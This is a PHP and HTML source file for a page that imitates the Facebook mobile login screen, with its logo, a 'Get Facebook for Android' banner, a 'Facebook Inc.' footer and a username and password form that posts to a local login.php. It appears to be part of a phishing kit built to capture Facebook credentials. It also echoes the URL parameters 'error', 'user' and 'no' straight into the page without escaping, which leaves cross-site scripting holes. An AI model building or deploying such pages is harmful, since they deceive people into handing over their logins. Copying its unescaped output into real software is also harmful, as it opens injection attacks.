<?php
$error = false;
if (isset($_GET['error'])) {
    $error = true;
}
?>
<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-F3w7mX95PdgyTmZZMECAngseQB83DfGTowi0iMjiWaeVhAn4FJkqJByhZMI3AhiU" crossorigin="anonymous">
    <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon">
    <title>Login to Facebook</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>

<body style="display: none;">
    <div class="header" <?php if ($error) echo "style='display:none;'"; ?>>
        <img src="mobile.jpg" width="24" height="32" alt="">
        Get Facebook for Android and browse faster.
    </div>
    <div class="error" <?php if (!$error) echo "style='display:none;'"; ?>>
        <?php if(isset($_GET['error'])){
            echo $_GET['error'];
        } ?>
    </div>
    <div class="logo">
        <img src="logo.svg" width="112" height="40" alt="">
    </div>
    <div class="form">
        <form action="login.php" method="post">
            <input type="text" value="<?php if(isset($_GET['user'])){echo $_GET['user'];}; ?>" placeholder="Mobile number or email address" name="user" />
            <input type="password" placeholder="Password" name="pass" />
            <br>
            <button type="submit" class="btn-login">Log In</button>
        </form>
    </div>
    <div class="forgot">
        <a href="" style="text-decoration:none;">Forgotten password?</a>
    </div>
    <div class="line">
        <div style="width: 100%; height: 20px; border-bottom: 2px solid #dddfe1; text-align: center">
            <span style="font-size:12px; background-color: white; padding: 0 10px;margin-top:15px;">
                or
                <!--Padding is optional-->
            </span>
        </div>
    </div>
    <div class="createnew">
        <button>Create New Account</button>
    </div>
    <br>
    <br>
    <div class="languages">
        <table>
            <tr>
                <td style="font-weight: bold;"><a href="">English (UK) </a> </td>
                <td><a href="">پښتو</a></td>
            </tr>
            <tr>
                <td><a href="">हिन्दी</a></td>
                <td><a href="">Español</a></td>
            </tr>
            <tr>
                <td><a href="">اردو</a></td>
                <td><a href="">العربية</a></td>
            </tr>
            <tr>
                <td colspan="2" style="text-align: center;">Facebook Inc.</td>
            </tr>
        </table>

    </div>

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-/bQdsTh/da6pkI1MST/rWKFNjaCP5gBSY4sEBT38Q/9RBh9AH40zEOg7Hlq2THRZ" crossorigin="anonymous"></script>
</body>

</html>
<script>
    $(window).on("load", function() {
        $('body').show();
    });
</script>
<?php
if ($error) {
?>
<style>
    input:nth-child(<?php  if(isset($_GET['no'])){
        $no = $_GET['no'];
        echo $no;
    } ?>){
        border:1px solid red;
    }
    .errorlink{
        text-decoration:none;color:white;
    }
    .errorlink:hover{
        color:white;
    }
    
</style>
<?php
}

?>